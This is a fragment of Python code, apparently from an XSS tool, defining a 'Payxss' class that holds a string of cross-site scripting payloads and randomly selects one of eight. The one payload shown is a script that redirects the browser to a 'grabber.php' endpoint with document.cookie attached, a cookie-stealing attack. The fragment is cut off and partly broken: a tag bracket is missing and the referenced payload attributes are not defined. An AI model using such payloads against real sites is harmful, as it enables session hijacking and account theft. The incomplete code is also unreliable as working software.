...
class Payxss(object):
    allPayloads = """script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
    ...
    randomlySelect = random.choice([1, 2, 3, 4, 5, 6, 7, 8])
    def selector(which: int = randomlySelect):
        if which == 1:return Payxss.firstF
        elif which == 2:return Payxss.secF
        elif which == 3:return Payxss.threeF
        elif which == 4:return Payxss.fourF
        elif which == 5:return Payxss.fiveF
        elif which == 6:return Payxss.sixF
        elif which == 7:return Payxss.sevenF
        elif which == 8:return Payxss.eightF 